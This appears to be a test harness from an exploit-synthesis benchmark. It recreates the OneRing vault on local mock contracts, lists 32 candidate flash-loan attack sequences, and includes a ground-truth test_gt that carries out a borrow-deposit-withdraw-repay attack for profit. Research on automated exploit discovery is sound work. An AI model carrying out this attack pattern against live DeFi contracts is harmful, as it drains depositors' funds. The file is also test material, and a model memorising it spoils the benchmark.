// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {MIM} from "./MIM.sol";
import {OneRingVault} from "./OneRingVault.sol";
import {Strategy} from "./Strategy.sol";
import {USDCE} from "@utils/USDCE.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract OneRingTest is Test, BlockLoader {
    USDCE usdce;
    MIM mim;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    Strategy strategy;
    OneRingVault vault;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdceAddr;
    address mimAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address strategyAddr;
    address vaultAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1647888248;
    uint112 reserve0pair = 84252468168797;
    uint112 reserve1pair = 105160077240219005280149210;
    uint32 blockTimestampLastpair = 1647888198;
    uint256 kLastpair = 0;
    uint256 price0CumulativeLastpair = 0;
    uint256 price1CumulativeLastpair = 0;
    uint256 totalSupplyvault = 4185979962653993796224466;
    uint256 balanceOfvaultpair = 0;
    uint256 balanceOfvaultattacker = 0;
    uint256 balanceOfvaultstrategy = 0;
    uint256 balanceOfvaultvault = 0;
    uint256 totalSupplymim = 378090762546918984877248087;
    uint256 balanceOfmimpair = 105160077240219005280149210;
    uint256 balanceOfmimattacker = 0;
    uint256 balanceOfmimstrategy = 0;
    uint256 balanceOfmimvault = 0;
    uint256 totalSupplyusdce = 1176800031172955;
    uint256 balanceOfusdcepair = 84252468168797;
    uint256 balanceOfusdceattacker = 0;
    uint256 balanceOfusdcestrategy = 0;
    uint256 balanceOfusdcevault = 0;

    function setUp() public {
        owner = address(this);
        usdce = new USDCE();
        usdceAddr = address(usdce);
        mim = new MIM(
            "Magic Internet Money",
            "MIM",
            18,
            address(0x0000000000000000000000000000000000000000),
            address(0xfA9dA51631268A30Ec3DDd1CcBf46c65FAD99251)
        );
        mimAddr = address(mim);
        pair = new UniswapV2Pair(
            address(usdce),
            address(mim),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        strategy = new Strategy();
        strategyAddr = address(strategy);
        vault = new OneRingVault(
            [address(usdce)],
            address(strategy),
            totalSupplyvault
        );
        vaultAddr = address(vault);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdce.transfer(address(pair), balanceOfusdcepair);
        mim.transfer(address(pair), balanceOfmimpair);
        usdce.transfer(address(strategy), 10_000_000e6);
        strategy.afterDeploy(address(vault), address(pair), address(usdce));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdce Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(usdce),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mim), address(usdce), mim.decimals());
        queryERC20BalanceDecimals(
            address(vault),
            address(usdce),
            vault.decimals()
        );
        emit log_string("");
        emit log_string("Mim Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(mim),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mim), address(mim), mim.decimals());
        queryERC20BalanceDecimals(
            address(vault),
            address(mim),
            vault.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(pair),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mim), address(pair), mim.decimals());
        queryERC20BalanceDecimals(
            address(vault),
            address(pair),
            vault.decimals()
        );
        emit log_string("");
        emit log_string("Strategy Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(strategy),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(
            address(mim),
            address(strategy),
            mim.decimals()
        );
        queryERC20BalanceDecimals(
            address(vault),
            address(strategy),
            vault.decimals()
        );
        emit log_string("");
        emit log_string("Vault Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(vault),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mim), address(vault), mim.decimals());
        queryERC20BalanceDecimals(
            address(vault),
            address(vault),
            vault.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(attacker),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(
            address(mim),
            address(attacker),
            mim.decimals()
        );
        queryERC20BalanceDecimals(
            address(vault),
            address(attacker),
            vault.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdce.balanceOf(attacker) >= 1e6 + balanceOfusdceattacker;
    }

    function borrow_usdce_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdce.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdce_owner(uint256 amount) internal eurus {
        usdce.transfer(owner, amount);
    }

    function borrow_mim_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        mim.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_mim_owner(uint256 amount) internal eurus {
        mim.transfer(owner, amount);
    }

    function borrow_vault_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        vault.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_vault_owner(uint256 amount) internal eurus {
        vault.transfer(owner, amount);
    }

    function borrow_usdce_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        usdce.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdce_pair(uint256 amount) internal eurus {
        usdce.transfer(address(pair), amount);
    }

    function borrow_mim_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        mim.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_mim_pair(uint256 amount) internal eurus {
        mim.transfer(address(pair), amount);
    }

    function borrow_vault_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        vault.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_vault_pair(uint256 amount) internal eurus {
        vault.transfer(address(pair), amount);
    }

    function swap_pair_attacker_usdce_mim(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdce.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_mim_usdce(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        mim.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function deposit_vault_usdce_vault(uint256 amount) internal eurus {
        usdce.approve(address(vault), type(uint256).max);
        vault.depositSafe(amount, address(usdce), 1);
    }

    function withdraw_vault_vault_usdce(uint256 amount) internal eurus {
        vault.withdraw(amount, address(usdce));
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdce_owner(amt0);
        swap_pair_attacker_usdce_mim(amt1, amt2);
        swap_pair_attacker_mim_usdce(amt3, amt4);
        payback_usdce_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_usdce_owner(amt0);
        deposit_vault_usdce_vault(amt1);
        withdraw_vault_vault_usdce(amt2);
        payback_usdce_owner(amt3);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_mim_owner(amt0);
        swap_pair_attacker_mim_usdce(amt1, amt2);
        swap_pair_attacker_usdce_mim(amt3, amt4);
        payback_mim_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_vault_owner(amt0);
        withdraw_vault_vault_usdce(amt1);
        deposit_vault_usdce_vault(amt2);
        payback_vault_owner(amt3);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_usdce_pair(amt0);
        deposit_vault_usdce_vault(amt1);
        withdraw_vault_vault_usdce(amt2);
        payback_usdce_pair(amt3);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_vault_pair(amt0);
        withdraw_vault_vault_usdce(amt1);
        deposit_vault_usdce_vault(amt2);
        payback_vault_pair(amt3);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdce_owner(amt0);
        swap_pair_attacker_usdce_mim(amt1, amt2);
        swap_pair_attacker_mim_usdce(amt3, amt4);
        swap_pair_attacker_usdce_mim(amt5, amt6);
        swap_pair_attacker_mim_usdce(amt7, amt8);
        payback_usdce_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdce_owner(amt0);
        swap_pair_attacker_usdce_mim(amt1, amt2);
        swap_pair_attacker_mim_usdce(amt3, amt4);
        deposit_vault_usdce_vault(amt5);
        withdraw_vault_vault_usdce(amt6);
        payback_usdce_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdce_owner(amt0);
        deposit_vault_usdce_vault(amt1);
        withdraw_vault_vault_usdce(amt2);
        swap_pair_attacker_usdce_mim(amt3, amt4);
        swap_pair_attacker_mim_usdce(amt5, amt6);
        payback_usdce_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdce_owner(amt0);
        deposit_vault_usdce_vault(amt1);
        withdraw_vault_vault_usdce(amt2);
        deposit_vault_usdce_vault(amt3);
        withdraw_vault_vault_usdce(amt4);
        payback_usdce_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_mim_owner(amt0);
        swap_pair_attacker_mim_usdce(amt1, amt2);
        swap_pair_attacker_usdce_mim(amt3, amt4);
        swap_pair_attacker_mim_usdce(amt5, amt6);
        swap_pair_attacker_usdce_mim(amt7, amt8);
        payback_mim_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_mim_owner(amt0);
        swap_pair_attacker_mim_usdce(amt1, amt2);
        deposit_vault_usdce_vault(amt3);
        withdraw_vault_vault_usdce(amt4);
        swap_pair_attacker_usdce_mim(amt5, amt6);
        payback_mim_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_vault_owner(amt0);
        withdraw_vault_vault_usdce(amt1);
        swap_pair_attacker_usdce_mim(amt2, amt3);
        swap_pair_attacker_mim_usdce(amt4, amt5);
        deposit_vault_usdce_vault(amt6);
        payback_vault_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_vault_owner(amt0);
        withdraw_vault_vault_usdce(amt1);
        deposit_vault_usdce_vault(amt2);
        withdraw_vault_vault_usdce(amt3);
        deposit_vault_usdce_vault(amt4);
        payback_vault_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdce_pair(amt0);
        deposit_vault_usdce_vault(amt1);
        withdraw_vault_vault_usdce(amt2);
        deposit_vault_usdce_vault(amt3);
        withdraw_vault_vault_usdce(amt4);
        payback_usdce_pair(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_vault_pair(amt0);
        withdraw_vault_vault_usdce(amt1);
        deposit_vault_usdce_vault(amt2);
        withdraw_vault_vault_usdce(amt3);
        deposit_vault_usdce_vault(amt4);
        payback_vault_pair(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdce_owner(amt0);
        swap_pair_attacker_usdce_mim(amt1, amt2);
        swap_pair_attacker_mim_usdce(amt3, amt4);
        swap_pair_attacker_usdce_mim(amt5, amt6);
        swap_pair_attacker_mim_usdce(amt7, amt8);
        deposit_vault_usdce_vault(amt9);
        withdraw_vault_vault_usdce(amt10);
        payback_usdce_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdce_owner(amt0);
        swap_pair_attacker_usdce_mim(amt1, amt2);
        swap_pair_attacker_mim_usdce(amt3, amt4);
        deposit_vault_usdce_vault(amt5);
        withdraw_vault_vault_usdce(amt6);
        swap_pair_attacker_usdce_mim(amt7, amt8);
        swap_pair_attacker_mim_usdce(amt9, amt10);
        payback_usdce_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdce_owner(amt0);
        swap_pair_attacker_usdce_mim(amt1, amt2);
        swap_pair_attacker_mim_usdce(amt3, amt4);
        deposit_vault_usdce_vault(amt5);
        withdraw_vault_vault_usdce(amt6);
        deposit_vault_usdce_vault(amt7);
        withdraw_vault_vault_usdce(amt8);
        payback_usdce_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdce_owner(amt0);
        deposit_vault_usdce_vault(amt1);
        withdraw_vault_vault_usdce(amt2);
        swap_pair_attacker_usdce_mim(amt3, amt4);
        swap_pair_attacker_mim_usdce(amt5, amt6);
        swap_pair_attacker_usdce_mim(amt7, amt8);
        swap_pair_attacker_mim_usdce(amt9, amt10);
        payback_usdce_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdce_owner(amt0);
        deposit_vault_usdce_vault(amt1);
        withdraw_vault_vault_usdce(amt2);
        swap_pair_attacker_usdce_mim(amt3, amt4);
        swap_pair_attacker_mim_usdce(amt5, amt6);
        deposit_vault_usdce_vault(amt7);
        withdraw_vault_vault_usdce(amt8);
        payback_usdce_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdce_owner(amt0);
        deposit_vault_usdce_vault(amt1);
        withdraw_vault_vault_usdce(amt2);
        deposit_vault_usdce_vault(amt3);
        withdraw_vault_vault_usdce(amt4);
        swap_pair_attacker_usdce_mim(amt5, amt6);
        swap_pair_attacker_mim_usdce(amt7, amt8);
        payback_usdce_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdce_owner(amt0);
        deposit_vault_usdce_vault(amt1);
        withdraw_vault_vault_usdce(amt2);
        deposit_vault_usdce_vault(amt3);
        withdraw_vault_vault_usdce(amt4);
        deposit_vault_usdce_vault(amt5);
        withdraw_vault_vault_usdce(amt6);
        payback_usdce_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_mim_owner(amt0);
        swap_pair_attacker_mim_usdce(amt1, amt2);
        swap_pair_attacker_usdce_mim(amt3, amt4);
        swap_pair_attacker_mim_usdce(amt5, amt6);
        deposit_vault_usdce_vault(amt7);
        withdraw_vault_vault_usdce(amt8);
        swap_pair_attacker_usdce_mim(amt9, amt10);
        payback_mim_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_mim_owner(amt0);
        swap_pair_attacker_mim_usdce(amt1, amt2);
        deposit_vault_usdce_vault(amt3);
        withdraw_vault_vault_usdce(amt4);
        swap_pair_attacker_usdce_mim(amt5, amt6);
        swap_pair_attacker_mim_usdce(amt7, amt8);
        swap_pair_attacker_usdce_mim(amt9, amt10);
        payback_mim_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_mim_owner(amt0);
        swap_pair_attacker_mim_usdce(amt1, amt2);
        deposit_vault_usdce_vault(amt3);
        withdraw_vault_vault_usdce(amt4);
        deposit_vault_usdce_vault(amt5);
        withdraw_vault_vault_usdce(amt6);
        swap_pair_attacker_usdce_mim(amt7, amt8);
        payback_mim_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_vault_owner(amt0);
        withdraw_vault_vault_usdce(amt1);
        swap_pair_attacker_usdce_mim(amt2, amt3);
        swap_pair_attacker_mim_usdce(amt4, amt5);
        swap_pair_attacker_usdce_mim(amt6, amt7);
        swap_pair_attacker_mim_usdce(amt8, amt9);
        deposit_vault_usdce_vault(amt10);
        payback_vault_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_vault_owner(amt0);
        withdraw_vault_vault_usdce(amt1);
        swap_pair_attacker_usdce_mim(amt2, amt3);
        swap_pair_attacker_mim_usdce(amt4, amt5);
        deposit_vault_usdce_vault(amt6);
        withdraw_vault_vault_usdce(amt7);
        deposit_vault_usdce_vault(amt8);
        payback_vault_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_vault_owner(amt0);
        withdraw_vault_vault_usdce(amt1);
        deposit_vault_usdce_vault(amt2);
        withdraw_vault_vault_usdce(amt3);
        swap_pair_attacker_usdce_mim(amt4, amt5);
        swap_pair_attacker_mim_usdce(amt6, amt7);
        deposit_vault_usdce_vault(amt8);
        payback_vault_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_vault_owner(amt0);
        withdraw_vault_vault_usdce(amt1);
        deposit_vault_usdce_vault(amt2);
        withdraw_vault_vault_usdce(amt3);
        deposit_vault_usdce_vault(amt4);
        withdraw_vault_vault_usdce(amt5);
        deposit_vault_usdce_vault(amt6);
        payback_vault_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdce_pair(amt0);
        deposit_vault_usdce_vault(amt1);
        withdraw_vault_vault_usdce(amt2);
        deposit_vault_usdce_vault(amt3);
        withdraw_vault_vault_usdce(amt4);
        deposit_vault_usdce_vault(amt5);
        withdraw_vault_vault_usdce(amt6);
        payback_usdce_pair(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_vault_pair(amt0);
        withdraw_vault_vault_usdce(amt1);
        deposit_vault_usdce_vault(amt2);
        withdraw_vault_vault_usdce(amt3);
        deposit_vault_usdce_vault(amt4);
        withdraw_vault_vault_usdce(amt5);
        deposit_vault_usdce_vault(amt6);
        payback_vault_pair(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        emit log_named_uint("amt0", 80000000e6);
        borrow_usdce_pair(80000000e6);
        printBalance("After step0 ");
        emit log_named_uint("amt1", 80000000e6);
        deposit_vault_usdce_vault(80000000e6);
        printBalance("After step1 ");
        emit log_named_uint("amt2", vault.balanceOf(attacker));
        withdraw_vault_vault_usdce(vault.balanceOf(attacker));
        printBalance("After step2 ");
        emit log_named_uint("amt3", (80000000e6 * 1003) / 1000);
        payback_usdce_pair((80000000e6 * 1003) / 1000);
        printBalance("After step3 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_usdce_pair(amt0);
        deposit_vault_usdce_vault(amt1);
        withdraw_vault_vault_usdce(amt2);
        payback_usdce_pair(amt3);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
